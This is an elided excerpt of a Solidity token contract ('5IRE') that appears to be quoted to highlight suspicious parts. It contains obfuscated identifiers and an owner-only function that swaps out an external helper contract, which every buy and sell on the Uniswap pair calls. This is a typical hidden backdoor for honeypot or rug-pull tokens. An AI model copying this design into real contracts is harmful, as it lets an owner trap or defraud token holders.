...
contract UserAmountChange is OVzzerStyou{
    using SafeMath for uint256;
...
contract TokenM is ERC20 {
    ...
    constructor(address tokenOwner) ERC20("5IRE", "5IRE") {
        ...
        voowchonge = new UserAmountChange();
    ...
    function chongeRuuaBcxouhMoer(OVzzerStyou _voowchonge) public onlyOwner {
        voowchonge = _voowchonge;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                voowchonge.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				voowchonge.addOutAmount(from, amount);
            }else{
                voowchonge.addOutAmount(from, amount);
                takeFee = false;
            }
